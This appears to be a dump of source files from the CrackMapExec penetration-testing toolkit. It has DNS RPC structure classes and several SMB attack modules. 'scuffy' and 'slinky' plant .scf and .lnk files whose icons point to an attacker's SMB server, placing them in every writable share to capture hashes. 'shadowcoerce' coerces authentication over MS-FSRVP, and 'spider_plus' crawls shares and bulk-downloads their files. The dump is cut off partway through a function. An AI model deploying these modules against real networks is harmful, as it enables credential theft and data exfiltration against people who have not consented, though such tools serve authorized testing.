((""cchNameLength"", ""B-dnsName""), (""dnsName"", "":""))\n\n\nclass DNS_COUNT_NAME(Structure):\n    """"""\n    DNS_COUNT_NAME\n    Used for FQDNs in LDAP communication\n    MUST be converted to DNS_RPC_NAME for RPC communication\n    [MS-DNSP] section 2.2.2.2.2\n    """"""\n\n    structure = ((""Length"", ""B-RawName""), (""LabelCount"", ""B""), (""RawName"", "":""))\n\n    def toFqdn(self):\n        ind = 0\n        labels = []\n        for i in range(self[""LabelCount""]):\n            nextlen = unpack(""B"", self[""RawName""][ind : ind + 1])[0]\n            labels.append(self[""RawName""][ind + 1 : ind + 1 + nextlen].decode(""utf-8""))\n            ind += nextlen + 1\n        # For the final dot\n        labels.append("""")\n        return ""."".join(labels)\n\n\nclass DNS_RPC_NODE(Structure):\n    """"""\n    DNS_RPC_NODE\n    [MS-DNSP] section 2.2.2.2.3\n    """"""\n\n    structure = (\n        (""wLength"", "">H""),\n        (""wRecordCount"", "">H""),\n        (""dwFlags"", "">L""),\n        (""dwChildCount"", "">L""),\n        (""dnsNodeName"", "":""),\n    )\n\n\nclass DNS_RPC_RECORD_A(Structure):\n    """"""\n    DNS_RPC_RECORD_A\n    [MS-DNSP] section 2.2.2.2.4.1\n    """"""\n\n    structure = ((""address"", "":""),)\n\n    def formatCanonical(self):\n        return socket.inet_ntoa(self[""address""])\n\n    def fromCanonical(self, canonical):\n        self[""address""] = socket.inet_aton(canonical)\n\n\nclass DNS_RPC_RECORD_NODE_NAME(Structure):\n    """"""\n    DNS_RPC_RECORD_NODE_NAME\n    [MS-DNSP] section 2.2.2.2.4.2\n    """"""\n\n    structure = ((""nameNode"", "":"", DNS_COUNT_NAME),)\n\n\nclass DNS_RPC_RECORD_SOA(Structure):\n    """"""\n    DNS_RPC_RECORD_SOA\n    [MS-DNSP] section 2.2.2.2.4.3\n    """"""\n\n    structure = (\n        (""dwSerialNo"", "">L""),\n        (""dwRefresh"", "">L""),\n        (""dwRetry"", "">L""),\n        (""dwExpire"", "">L""),\n        (""dwMinimumTtl"", "">L""),\n        (""namePrimaryServer"", "":"", DNS_COUNT_NAME),\n        (""zoneAdminEmail"", "":"", DNS_COUNT_NAME),\n    )\n\n\nclass DNS_RPC_RECORD_NULL(Structure):\n    """"""\n    DNS_RPC_RECORD_NULL\n    [MS-DNSP] section 2.2.2.2.4.4\n    """"""\n\n    structure = ((""bData"", "":""),)\n\n\n# Some missing structures here that I skipped\n\n\nclass DNS_RPC_RECORD_NAME_PREFERENCE(Structure):\n    """"""\n    DNS_RPC_RECORD_NAME_PREFERENCE\n    [MS-DNSP] section 2.2.2.2.4.8\n    """"""\n\n    structure = ((""wPreference"", "">H""), (""nameExchange"", "":"", DNS_COUNT_NAME))\n\n\n# Some missing structures here that I skipped\n\n\nclass DNS_RPC_RECORD_AAAA(Structure):\n    """"""\n    DNS_RPC_RECORD_AAAA\n    [MS-DNSP] section 2.2.2.2.4.17\n    """"""\n\n    structure = ((""ipv6Address"", ""16s""),)\n\n    def formatCanonical(self):\n        return socket.inet_ntop(socket.AF_INET6, self[""ipv6Address""])\n\n\nclass DNS_RPC_RECORD_SRV(Structure):\n    """"""\n    DNS_RPC_RECORD_SRV\n    [MS-DNSP] section 2.2.2.2.4.18\n    """"""\n\n    structure = (\n        (""wPriority"", "">H""),\n        (""wWeight"", "">H""),\n        (""wPort"", "">H""),\n        (""nameTarget"", "":"", DNS_COUNT_NAME),\n    )\n\n\nclass DNS_RPC_RECORD_TS(Structure):\n    """"""\n    DNS_RPC_RECORD_TS\n    [MS-DNSP] section 2.2.2.2.4.23\n    """"""\n\n    structure = ((""entombedTime"", ""<Q""),)\n\n    def toDatetime(self):\n        microseconds = int(self[""entombedTime""] / 10)\n        try:\n            return datetime.datetime(1601, 1, 1) + datetime.timedelta(microseconds=microseconds)\n        except OverflowError:\n            return None\n', 'scuffy.py': '#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\nimport ntpath\nfrom sys import exit\n\n\nclass CMEModule:\n    """"""\n    Original idea and PoC by Mubix ""Rob"" Fuller\n    URL: https://room362.com/post/2016/smb-http-auth-capture-via-scf/\n    Module by: @kierangroome\n    """"""\n\n    name = ""scuffy""\n    description = ""Creates and dumps an arbitrary .scf file with the icon property containing a UNC path to the declared SMB server against all writeable shares""\n    supported_protocols = [""smb""]\n    opsec_safe = False\n    multiple_hosts = True\n\n    def __init__(self, context=None, module_options=None):\n        self.context = context\n        self.module_options = module_options\n        self.cleanup = None\n        self.server = None\n        self.file_path = None\n        self.scf_path = None\n        self.scf_name = None\n\n    def options(self, context, module_options):\n        """"""\n        SERVER      IP of the SMB server\n        NAME        SCF file name\n        CLEANUP     Cleanup (choices: True or False)\n        """"""\n        self.cleanup = False\n\n        if ""CLEANUP"" in module_options:\n            self.cleanup = bool(module_options[""CLEANUP""])\n\n        if ""NAME"" not in module_options:\n            context.log.fail(""NAME option is required!"")\n            exit(1)\n\n        if not self.cleanup and ""SERVER"" not in module_options:\n            context.log.fail(""SERVER option is required!"")\n            exit(1)\n\n        self.scf_name = module_options[""NAME""]\n        self.scf_path = f""/tmp/{self.scf_name}.scf""\n        self.file_path = ntpath.join(""\\\\"", f""{self.scf_name}.scf"")\n\n        if not self.cleanup:\n            self.server = module_options[""SERVER""]\n            scuf = open(self.scf_path, ""a"")\n            scuf.write(f""[Shell]\\n"")\n            scuf.write(f""Command=2\\n"")\n            scuf.write(f""IconFile=\\\\\\\\{self.server}\\\\share\\\\icon.ico\\n"")\n            scuf.close()\n\n    def on_login(self, context, connection):\n        shares = connection.shares()\n        for share in shares:\n            if ""WRITE"" in share[""access""] and share[""name""] not in [\n                ""C$"",\n                ""ADMIN$"",\n                ""NETLOGON"",\n            ]:\n                context.log.success(f""Found writable share: {share[\'name\']}"")\n                if not self.cleanup:\n                    with open(self.scf_path, ""rb"") as scf:\n                        try:\n                            connection.conn.putFile(share[""name""], self.file_path, scf.read)\n                            context.log.success(f""Created SCF file on the {share[\'name\']} share"")\n                        except Exception as e:\n                            context.log.fail(f""Error writing SCF file to share {share[\'name\']}: {e}"")\n                else:\n                    try:\n                        connection.conn.deleteFile(share[""name""], self.file_path)\n                        context.log.success(f""Deleted SCF file on the {share[\'name\']} share"")\n                    except Exception as e:\n                        context.log.fail(f""Error deleting SCF file on share {share[\'name\']}: {e}"")\n', 'shadowcoerce.py': '#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\nimport time\nfrom impacket import system_errors\nfrom impacket.dcerpc.v5 import transport\nfrom impacket.dcerpc.v5.ndr import NDRCALL\nfrom impacket.dcerpc.v5.dtypes import BOOL, LONG, WSTR, LPWSTR\nfrom impacket.uuid import uuidtup_to_bin\nfrom impacket.dcerpc.v5.rpcrt import DCERPCException\nfrom impacket.dcerpc.v5.rpcrt import (\n    RPC_C_AUTHN_WINNT,\n    RPC_C_AUTHN_LEVEL_PKT_PRIVACY,\n    RPC_C_AUTHN_GSS_NEGOTIATE,\n)\nfrom impacket.smbconnection import SessionError\nfrom cme.logger import cme_logger\n\n\nclass CMEModule:\n    name = ""shadowcoerce""\n    description = ""Module to check if the target is vulnerable to ShadowCoerce, credit to @Shutdown and @topotam""\n    supported_protocols = [""smb""]\n    opsec_safe = True\n    multiple_hosts = True\n\n    def options(self, context, module_options):\n        """"""\n        IPSC             Use IsPathShadowCopied (default: False). ex. IPSC=true\n        LISTENER         Listener IP address (default: 127.0.0.1)\n        """"""\n        self.ipsc = False\n        self.listener = ""127.0.0.1""\n        if ""LISTENER"" in module_options:\n            self.listener = module_options[""LISTENER""]\n        if ""IPSC"" in module_options:\n            # Any string that\'s not empty can be casted to bool True\n            self.ipsc = bool(module_options[""IPSC""])\n\n    def on_login(self, context, connection):\n        c = CoerceAuth()\n        dce = c.connect(\n            username=connection.username,\n            password=connection.password,\n            domain=connection.domain,\n            lmhash=connection.lmhash,\n            nthash=connection.nthash,\n            aesKey=connection.aesKey,\n            target=connection.host if not connection.kerberos else connection.hostname + ""."" + connection.domain,\n            pipe=""FssagentRpc"",\n            doKerberos=connection.kerberos,\n            dcHost=connection.kdcHost,\n        )\n\n        # If pipe not available, try again. ""TL;DR: run the command twice if it doesn\'t work."" - @Shutdown\n        if dce == 1:\n            context.log.debug(""First try failed. Creating another dce connection..."")\n            # Sleeping mandatory for second try\n            time.sleep(2)\n            dce = c.connect(\n                username=connection.username,\n                password=connection.password,\n                domain=connection.domain,\n                lmhash=connection.lmhash,\n                nthash=connection.nthash,\n                aesKey=connection.aesKey,\n                target=connection.host if not connection.kerberos else connection.hostname + ""."" + connection.domain,\n                pipe=""FssagentRpc"",\n            )\n\n        if self.ipsc:\n            context.log.debug(""ipsc = %s"", self.ipsc)\n            context.log.debug(""Using IsPathShadowCopied!"")\n            result = c.IsPathShadowCopied(dce, self.listener)\n        else:\n            context.log.debug(""ipsc = %s"", self.ipsc)\n            context.log.debug(""Using the default IsPathSupported"")\n            result = c.IsPathSupported(dce, self.listener)\n\n        try:\n            dce.disconnect()\n        except SessionError as e:\n            context.log.debug(f""Error disconnecting DCE session: {e}"")\n\n        if result:\n            context.log.highlight(""VULNERABLE"")\n            context.log.highlight(""Next step: https://github.com/ShutdownRepo/ShadowCoerce"")\n\n        else:\n            context.log.debug(""Target not vulnerable to ShadowCoerce"")\n\n\nclass DCERPCSessionError(DCERPCException):\n    def __init__(self, error_string=None, error_code=None, packet=None):\n        DCERPCException.__init__(self, error_string, error_code, packet)\n\n    def __str__(self):\n        key = self.error_code\n        error_messages = system_errors.ERROR_MESSAGES\n        error_messages.update(MSFSRVP_ERROR_CODES)\n        if key in error_messages:\n            error_msg_short = error_messages[key][0]\n            error_msg_verbose = error_messages[key][1]\n            return ""SessionError: code: 0x%x - %s - %s"" % (\n                self.error_code,\n                error_msg_short,\n                error_msg_verbose,\n            )\n        else:\n            return ""SessionError: unknown error code: 0x%x"" % self.error_code\n\n\n################################################################################\n# Error Codes\n################################################################################\nMSFSRVP_ERROR_CODES = {\n    0x80070005: (\n        ""E_ACCESSDENIED"",\n        ""The caller does not have the permissions to perform the operation"",\n    ),\n    0x80070057: (""E_INVALIDARG"", ""One or more arguments are invalid.""),\n    0x80042301: (\n        ""FSRVP_E_BAD_STATE"",\n        ""A method call was invalid because of the state of the server."",\n    ),\n    0x80042316: (\n        ""FSRVP_E_SHADOW_COPY_SET_IN_PROGRESS"",\n        ""A call was made to either SetContext (Opnum 1) or StartShadowCopySet (Opnum 2) while the creation of another shadow copy set is in progress."",\n    ),\n    0x8004230C: (\n        ""FSRVP_E_NOT_SUPPORTED"",\n        ""The file store that contains the share to be shadow copied is not supported by the server."",\n    ),\n    0x00000102: (\n        ""FSRVP_E_WAIT_TIMEOUT"",\n        ""The wait for a shadow copy commit or expose operation has timed out."",\n    ),\n    0xFFFFFFFF: (\n        ""FSRVP_E_WAIT_FAILED"",\n        ""The wait for a shadow copy commit expose operation has failed."",\n    ),\n    0x8004230D: (\n        ""FSRVP_E_OBJECT_ALREADY_EXISTS"",\n        ""The specified object already exists."",\n    ),\n    0x80042308: (""FSRVP_E_OBJECT_NOT_FOUND"", ""The specified object does not exist.""),\n    0x8004231B: (\n        ""FSRVP_E_UNSUPPORTED_CONTEXT"",\n        ""The specified context value is invalid."",\n    ),\n    0x80042501: (\n        ""FSRVP_E_SHADOWCOPYSET_ID_MISMATCH"",\n        ""The provided ShadowCopySetId does not exist."",\n    ),\n}\n\n\n################################################################################\n# RPC CALLS\n################################################################################\nclass IsPathSupported(NDRCALL):\n    opnum = 8\n    structure = ((""ShareName"", WSTR),)\n\n\nclass IsPathSupportedResponse(NDRCALL):\n    structure = (\n        (""SupportedByThisProvider"", BOOL),\n        (""OwnerMachineName"", LPWSTR),\n    )\n\n\nclass IsPathShadowCopied(NDRCALL):\n    opnum = 9\n    structure = ((""ShareName"", WSTR),)\n\n\nclass IsPathShadowCopiedResponse(NDRCALL):\n    structure = (\n        (""ShadowCopyPresent"", BOOL),\n        (""ShadowCopyCompatibility"", LONG),\n    )\n\n\nOPNUMS = {\n    8: (IsPathSupported, IsPathSupportedResponse),\n    9: (IsPathShadowCopied, IsPathShadowCopiedResponse),\n}\n\n\nclass CoerceAuth:\n    def connect(\n        self,\n        username,\n        password,\n        domain,\n        lmhash,\n        nthash,\n        aesKey,\n        target,\n        pipe,\n        doKerberos,\n        dcHost,\n    ):\n        binding_params = {\n            ""FssagentRpc"": {\n                ""stringBinding"": r""ncacn_np:%s[\\PIPE\\FssagentRpc]"" % target,\n                ""UUID"": (""a8e0653c-2744-4389-a61d-7373df8b2292"", ""1.0""),\n            },\n        }\n        rpctransport = transport.DCERPCTransportFactory(binding_params[pipe][""stringBinding""])\n        dce = rpctransport.get_dce_rpc()\n\n        if hasattr(rpctransport, ""set_credentials""):\n            rpctransport.set_credentials(\n                username=username,\n                password=password,\n                domain=domain,\n                lmhash=lmhash,\n                nthash=nthash,\n                aesKey=aesKey,\n            )\n\n        dce.set_credentials(*rpctransport.get_credentials())\n        dce.set_auth_type(RPC_C_AUTHN_WINNT)\n        dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)\n\n        if doKerberos:\n            rpctransport.set_kerberos(doKerberos, kdcHost=dcHost)\n            dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)\n\n        cme_logger.info(""Connecting to %s"" % binding_params[pipe][""stringBinding""])\n\n        try:\n            dce.connect()\n        except Exception as e:\n            # If pipe not available, try again. ""TL;DR: run the command twice if it doesn\'t work."" - @ShutdownRepo\n            if str(e).find(""STATUS_PIPE_NOT_AVAILABLE"") >= 0:\n                dce.disconnect()\n                return 1\n\n            cme_logger.debug(""Something went wrong, check error status => %s"" % str(e))\n\n        cme_logger.info(""Connected!"")\n        cme_logger.info(""Binding to %s"" % binding_params[pipe][""UUID""][0])\n        try:\n            dce.bind(uuidtup_to_bin(binding_params[pipe][""UUID""]))\n        except Exception as e:\n            cme_logger.debug(""Something went wrong, check error status => %s"" % str(e))\n\n        cme_logger.info(""Successfully bound!"")\n        return dce\n\n    def IsPathShadowCopied(self, dce, listener):\n        cme_logger.debug(""Sending IsPathShadowCopied!"")\n        try:\n            request = IsPathShadowCopied()\n            # only NETLOGON and SYSVOL were detected working here\n            # setting the share to something else raises a 0x80042308 (FSRVP_E_OBJECT_NOT_FOUND) or 0x8004230c (FSRVP_E_NOT_SUPPORTED)\n            request[""ShareName""] = ""\\\\\\\\%s\\\\NETLOGON\\x00"" % listener\n            # request.dump()\n            dce.request(request)\n        except Exception as e:\n            cme_logger.debug(""Something went wrong, check error status => %s"", str(e))\n            cme_logger.debug(""Attack may of may not have worked, check your listener..."")\n            return False\n\n        return True\n\n    def IsPathSupported(self, dce, listener):\n        cme_logger.debug(""Sending IsPathSupported!"")\n        try:\n            request = IsPathSupported()\n            # only NETLOGON and SYSVOL were detected working here\n            # setting the share to something else raises a 0x80042308 (FSRVP_E_OBJECT_NOT_FOUND) or 0x8004230c (FSRVP_E_NOT_SUPPORTED)\n            request[""ShareName""] = ""\\\\\\\\%s\\\\NETLOGON\\x00"" % listener\n            dce.request(request)\n        except Exception as e:\n            cme_logger.debug(""Something went wrong, check error status => %s"", str(e))\n            cme_logger.debug(""Attack may of may not have worked, check your listener..."")\n            return False\n\n        return True\n', 'slinky.py': '#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\nimport pylnk3\nimport ntpath\nfrom sys import exit\n\n\nclass CMEModule:\n    """"""\n    Original idea and PoC by Justin Angel (@4rch4ngel86)\n    Module by @byt3bl33d3r\n    """"""\n\n    name = ""slinky""\n    description = ""Creates windows shortcuts with the icon attribute containing a UNC path to the specified SMB server in all shares with write permissions""\n    supported_protocols = [""smb""]\n    opsec_safe = False\n    multiple_hosts = True\n\n    def __init__(self, context=None, module_options=None):\n        self.context = context\n        self.module_options = module_options\n        self.server = None\n        self.file_path = None\n        self.lnk_path = None\n        self.lnk_name = None\n        self.cleanup = None\n\n    def options(self, context, module_options):\n        """"""\n        SERVER        IP of the SMB server\n        NAME          LNK file name\n        CLEANUP       Cleanup (choices: True or False)\n        """"""\n\n        self.cleanup = False\n\n        if ""CLEANUP"" in module_options:\n            self.cleanup = bool(module_options[""CLEANUP""])\n\n        if ""NAME"" not in module_options:\n            context.log.fail(""NAME option is required!"")\n            exit(1)\n\n        if not self.cleanup and ""SERVER"" not in module_options:\n            context.log.fail(""SERVER option is required!"")\n            exit(1)\n\n        self.lnk_name = module_options[""NAME""]\n        self.lnk_path = f""/tmp/{self.lnk_name}.lnk""\n        self.file_path = ntpath.join(""\\\\"", f""{self.lnk_name}.lnk"")\n\n        if not self.cleanup:\n            self.server = module_options[""SERVER""]\n            link = pylnk3.create(self.lnk_path)\n            link.icon = f""\\\\\\\\{self.server}\\\\icons\\\\icon.ico""\n            link.save()\n\n    def on_login(self, context, connection):\n        shares = connection.shares()\n        for share in shares:\n            if ""WRITE"" in share[""access""] and share[""name""] not in [\n                ""C$"",\n                ""ADMIN$"",\n                ""NETLOGON"",\n            ]:\n                context.log.success(f""Found writable share: {share[\'name\']}"")\n                if not self.cleanup:\n                    with open(self.lnk_path, ""rb"") as lnk:\n                        try:\n                            connection.conn.putFile(share[""name""], self.file_path, lnk.read)\n                            context.log.success(f""Created LNK file on the {share[\'name\']} share"")\n                        except Exception as e:\n                            context.log.fail(f""Error writing LNK file to share {share[\'name\']}: {e}"")\n                else:\n                    try:\n                        connection.conn.deleteFile(share[""name""], self.file_path)\n                        context.log.success(f""Deleted LNK file on the {share[\'name\']} share"")\n                    except Exception as e:\n                        context.log.fail(f""Error deleting LNK file on share {share[\'name\']}: {e}"")\n', 'spider_plus.py': '#!/usr/bin/env python3\r\n# -*- coding: utf-8 -*-\r\n\r\nimport json\r\nimport errno\r\nimport os\r\nimport time\r\nimport traceback\r\nfrom cme.protocols.smb.remotefile import RemoteFile\r\nfrom impacket.smb3structs import FILE_READ_DATA\r\nfrom impacket.smbconnection import SessionError\r\n\r\n\r\nCHUNK_SIZE = 4096\r\n\r\n\r\ndef human_size(nbytes):\r\n    """"""\r\n    This function takes a number of bytes as input and converts it to a human-readable\r\n    size representation with appropriate units (e.g., KB, MB, GB, TB).\r\n    """"""\r\n    suffixes = [""B"", ""KB"", ""MB"", ""GB"", ""TB"", ""PB"", ""EB"", ""ZB"", ""YB""]\r\n\r\n    # Find the appropriate unit suffix and convert bytes to higher units\r\n    for i in range(len(suffixes)):\r\n        if nbytes < 1024 or i == len(suffixes) - 1:\r\n            break\r\n        nbytes /= 1024.0\r\n\r\n    # Format the number of bytes with two decimal places and remove trailing zeros and decimal point\r\n    size_str = f""{nbytes:.2f}"".rstrip(""0"").rstrip(""."")\r\n\r\n    # Return the human-readable size with the appropriate unit suffix\r\n    return f""{size_str} {suffixes[i]}""\r\n\r\n\r\ndef human_time(timestamp):\r\n    """"""This function takes a numerical timestamp (seconds since the epoch) and formats it\r\n    as a human-readable date and time in the format ""YYYY-MM-DD HH:MM:SS"".\r\n    """"""\r\n    return time.strftime(""%Y-%m-%d %H:%M:%S"", time.localtime(timestamp))\r\n\r\n\r\ndef make_dirs(path):\r\n    """"""\r\n    This function attempts to create directories at the given path. It handles the\r\n    exception `os.errno.EEXIST` that may occur if the directories already exist.\r\n    """"""\r\n    try:\r\n        os.makedirs(path)\r\n    except OSError as e:\r\n        if e.errno != errno.EEXIST:\r\n            raise\r\n        pass\r\n\r\n\r\ndef get_list_from_option(opt):\r\n    """"""\r\n    This function takes a comma-separated string and converts it to a list of lowercase strings.\r\n    It filters out empty strings from the input before converting.\r\n    """"""\r\n    return list(map(lambda o: o.lower(), filter(bool, opt.split("",""))))\r\n\r\n\r\nclass SMBSpiderPlus:\r\n    def __init__(\r\n        self,\r\n        smb,\r\n        logger,\r\n        download_flag,\r\n        stats_flag,\r\n        exclude_exts,\r\n        exclude_filter,\r\n        max_file_size,\r\n        output_folder,\r\n    ):\r\n        self.smb = smb\r\n        self.host = self.smb.conn.getRemoteHost()\r\n        self.max_connection_attempts = 5\r\n        self.logger = logger\r\n        self.results = {}\r\n        self.stats = {\r\n            ""shares"": list(),\r\n            ""shares_readable"": list(),\r\n            ""shares_writable"": list(),\r\n            ""num_shares_filtered"": 0,\r\n            ""num_folders"": 0,\r\n            ""num_folders_filtered"": 0,\r\n            ""num_files"": 0,\r\n            ""file_sizes"": list(),\r\n            ""file_exts"": set(),\r\n            ""num_get_success"": 0,\r\n            ""num_get_fail"": 0,\r\n            ""num_files_filtered"": 0,\r\n            ""num_files_unmodified"": 0,\r\n            ""num_files_updated"": 0,\r\n        }\r\n        self.download_flag = download_flag\r\n        self.stats_flag = stats_flag\r\n        self.exclude_filter = exclude_filter\r\n        self.exclude_exts = exclude_exts\r\n        self.max_file_size = max_file_size\r\n        self.output_folder = output_folder\r\n\r\n        # Make sure the output_folder exists\r\n        make_dirs(self.output_folder)\r\n\r\n    def reconnect(self):\r\n        """"""This function performs a series of reconnection attempts, up to `self.max_connection_attempts`,\r\n        with a 3-second delay between each attempt. It renegotiates the session by creating a new\r\n        connection object and logging in again.\r\n        """"""\r\n        for i in range(1, self.max_connection_attempts + 1):\r\n            self.logger.display(f""Reconnection attempt #{i}/{self.max_connection_attempts} to server."")\r\n\r\n            # Renegotiate the session\r\n            time.sleep(3)\r\n            self.smb.create_conn_obj()\r\n            self.smb.login()\r\n            return True\r\n\r\n        return False\r\n\r\n    def list_path(self, share, subfolder):\r\n        """"""This function returns a list of paths for a given share/folder.""""""\r\n        filelist = []\r\n        try:\r\n            # Get file list for the current folder\r\n            filelist = self.smb.conn.listPath(share, subfolder + ""*"")\r\n\r\n        except SessionError as e:\r\n            self.logger.debug(f\'Failed listing files on share ""{share}"" in folder ""{subfolder}"".\')\r\n            self.logger.debug(str(e))\r\n\r\n            if ""STATUS_ACCESS_DENIED"" in str(e):\r\n                self.logger.debug(f\'Cannot list files in folder ""{subfolder}"".\')\r\n\r\n            elif ""STATUS_OBJECT_PATH_NOT_FOUND"" in str(e):\r\n                self.logger.debug(f""The folder {subfolder} does not exist."")\r\n\r\n            elif self.reconnect():\r\n                filelist = self.list_path(share, subfolder)\r\n\r\n        return filelist\r\n\r\n    def get_remote_file(self, share, path):\r\n        """"""This function will check if a path is readable in a SMB share.""""""\r\n        try:\r\n            remote_file = RemoteFile(self.smb.conn, path, share, access=FILE_READ_DATA)\r\n            return remote_file\r\n        except SessionError:\r\n            if self.reconnect():\r\n                return self.get_remote_file(share, path)\r\n\r\n            return None\r\n\r\n    def read_chunk(self, remote_file, chunk_size=CHUNK_SIZE):\r\n        """"""This function reads the next chunk of data from the provided remote file using\r\n        the specified chunk size. If a `SessionError` is encountered,\r\n        it retries up to 3 times by reconnecting the SMB connection. If the maximum number\r\n        of retries is exhausted or an unexpected exception occurs, it returns an empty chunk.\r\n        """"""\r\n\r\n        chunk = """"\r\n        retry = 3\r\n\r\n        while retry > 0:\r\n            retry -= 1\r\n            try:\r\n                chunk = remote_file.read(chunk_size)\r\n                break\r\n\r\n            except SessionError:\r\n                if self.reconnect():\r\n                    # Little hack to reset the smb connection instance\r\n                    remote_file.__smbConnection = self.smb.conn\r\n                    return self.read_chunk(remote_file)\r\n\r\n            except Exception:\r\n                traceback.print_exc()\r\n                break\r\n\r\n        return chunk\r\n\r\n    def get_file_save_path(self, remote_file):\r\n        """"""This function processes the remote file path to extract the filename and the folder\r\n        path where the file should be saved locally. It converts forward slashes (/) and backslashes (\\)\r\n        in the remote file path to the appropriate path separator for the local file system.\r\n        The folder path and filename are then obtained separately.\r\n        """"""\r\n\r\n        # Remove the backslash before the remote host part and replace slashes with the appropriate path separator\r\n        remote_file_path = str(remote_file)[2:].replace(""/"", os.path.sep).replace(""\\\\"", os.path.sep)\r\n\r\n        # Split the path to obtain the folder path and the filename\r\n        folder, filename = os.path.split(remote_file_path)\r\n\r\n        # Join the output folder with the folder path to get the final local folder path\r\n        folder = os.path.join(self.output_folder, folder)\r\n\r\n        return folder, filename\r\n\r\n    def spider_shares(self):\r\n        """"""This function enumerates all available shares for the SMB connection, spiders\r\n        through the readable shares, and saves the metadata of the shares to a JSON file.\r\n        """"""\r\n        self.logger.info(""Enumerating shares for spidering."")\r\n        shares = self.smb.shares()\r\n\r\n        try:\r\n            # Get all available shares for the SMB connection\r\n            for share in shares:\r\n                share_perms = share[""access""]\r\n                share_name = share[""name""]\r\n                self.stats[""shares""].append(share_name)\r\n\r\n                self.logger.info(f\'Share ""{share_name}"" has perms {share_perms}\')\r\n                if ""WRITE"" in share_perms:\r\n                    self.stats[""shares_writable""].append(share_name)\r\n                if ""READ"" in share_perms:\r\n                    self.stats[""shares_readable""].append(share_name)\r\n                else:\r\n                    # We only want to spider readable shares\r\n                    self.logger.debug(f\'Share ""{share_name}"" not readable.\')\r\n                    continue\r\n\r\n                # `exclude_filter` is applied to the shares name\r\n                if share_name.lower() in self.exclude_filter:\r\n                    self.logger.info(f\'Share ""{share_name}"" has been excluded.\')\r\n                    self.stats[""num_shares_filtered""] += 1\r\n                    continue\r\n\r\n                try:\r\n                    # Start the spider at the root of the share folder\r\n                    self.results[share_name] = {}\r\n                    self.spider_folder(share_name, """")\r\n                except SessionError:\r\n                    traceback.print_exc()\r\n                    self.logger.fail(f""Got a session error while spidering."")\r\n                    self.reconnect()\r\n\r\n        except Exception as e:\r\n            traceback.print_exc()\r\n            self.logger.fail(f""Error enumerating shares: {str(e)}"")\r\n\r\n        # Save the metadata.\r\n        self.dump_folder_metadata(self.results)\r\n\r\n        # Print stats.\r\n        if self.stats_flag:\r\n            self.print_stats()\r\n\r\n        return self.results\r\n\r\n    def spider_folder(self, share_name, folder):\r\n        """"""This recursive function traverses through the contents of the specified share and folder.\r\n        It checks each entry (file or folder) against various filters, performs file metadata recording,\r\n        and downloads eligible files if the download flag is set.\r\n        """"""\r\n        self.logger.info(f\'Spider share ""{share_name}"" in folder ""{folder}"".\')\r\n\r\n        filelist = self.list_path(share_name, folder + ""*"")\r\n\r\n        # For each entry:\r\n        # - It\'s a folder then we spider it (skipping `.` and `..`)\r\n        # - It\'s a file then we apply the checks\r\n        for result in filelist:\r\n            next_filedir = result.get_longname()\r\n            if next_filedir in [""."", ""..""]:\r\n                continue\r\n            next_fullpath = folder + next_filedir\r\n            result_type = ""folder"" if result.is_directory() else ""file""\r\n            self.stats[f""num_{result_type}s""] += 1\r\n\r\n            # Check file-dir exclusion filter.\r\n            if any(d in next_filedir.lower() for d in self.exclude_filter):\r\n                self.logger.info(f\'The {result_type} ""{next_filedir}"" has been excluded\')\r\n                self.stats[f""{result_type}s_filtered""] += 1\r\n                continue\r\n\r\n            if result_type == ""folder"":\r\n                self.logger.info(f\'Current folder in share ""{share_name}"": ""{next_fullpath}""\')\r\n                self.spider_folder(share_name, next_fullpath + ""/"")\r\n            else:\r\n                self.logger.info(f\'Current file in share ""{share_name}"": ""{next_fullpath}""\')\r\n                self.parse_file(share_name, next_fullpath, result)\r\n\r\n    def parse_file(self, share_name, file_path, file_info):\r\n        """"""This function checks file attributes against various filters, records file metadata,\r\n        and downloads eligible files if the download flag is set.\r\n        """"""\r\n\r\n        # Record the file metadata\r\n        file_size = file_info.get_filesize()\r\n        file_creation_time = file_info.get_ctime_epoch()\r\n        file_modified_time = file_info.get_mtime_epoch()\r\n        file_access_time = file_info.get_atime_epoch()\r\n        self.results[share_name][file_path] = {\r\n            ""size"": human_size(file_size),\r\n            ""ctime_epoch"": human_time(file_creation_time),\r\n            ""mtime_epoch"": human_time(file_modified_time),\r\n            ""atime_epoch"": human_time(file_access_time),\r\n        }\r\n        self.stats[""file_sizes""].append(file_size)\r\n\r\n        # Check if proceeding with download attempt.\r\n        if not self.download_flag:\r\n            return\r\n\r\n        # Check file extension filter.\r\n        _, file_extension = os.path.splitext(file_path)\r\n        if file_extension:\r\n            self.stats[""file_exts""].add(file_extension.lower())\r\n            if file_extension.lower() in self.exclude_exts:\r\n                self.logger.info(f\'The file ""{file_path}"" has an excluded extension.\')\r\n                self.stats[""num_files_filtered""] += 1\r\n                return\r\n\r\n        # Check file size limits.\r\n        if file_size > self.max_file_size:\r\n            self.logger.info(f""File {file_path} has size {human_size(file_size)} > max size {human_size(self.max_file_size)}."")\r\n            self.stats[""num_files_filtered""] += 1\r\n            return\r\n\r\n        # Check if the remote file is readable.\r\n        remote_file = self.get_remote_file(share_name, file_path)\r\n        if not remote_file:\r\n            self.logger.fail(f\'Cannot read remote file ""{file_path}"".\')\r\n            self.stats[""num_get_fail""] += 1\r\n            return\r\n\r\n        # Check if the file is already downloaded and up-to-date.\r\n        file_dir, file_name = self.get_file_save_path(remote_file)\r\n        download_path = os.path.join(file_dir, file_name)\r\n        needs_update_flag = False\r\n        if os.path.exists(download_path):\r\n            if file_modified_time <= os.stat(download_path).st_mtime and os.path.getsize(download_path) == file_size:\r\n                self.logger.info(f\'File already downloaded ""{file_path}"" => ""{download_path}"".\')\r\n                self.stats[""num_files_unmodified""] += 1\r\n                return\r\n            else:\r\n                needs_update_flag = True\r\n\r\n        # Download file.\r\n        download_success = False\r\n        try:\r\n            self.logger.info(f\'Downloading file ""{file_path}"" => ""{download_path}"".\')\r\n            remote_file.open()\r\n            self.save_file(remote_file, share_name)\r\n            remote_file.close()\r\n            download_success = True\r\n        except SessionError as e:\r\n            if ""STATUS_SHARING_VIOLATION"" in str(e):\r\n                pass\r\n        except Exception as e:\r\n            self.logger.fail(f\'Failed to download file ""{file_path}"". Error: {str(e)}\')\r\n\r\n        # Increment stats counters\r\n        if download_success:\r\n            self.stats[""num_get_success""] += 1\r\n            if needs_update_flag:\r\n                self.stats[""num_files_updated""] += 1\r\n        else:\r\n            self.stats[""num_get_fail""] += 1\r\n\r\n    def save_file(self, remote_file, 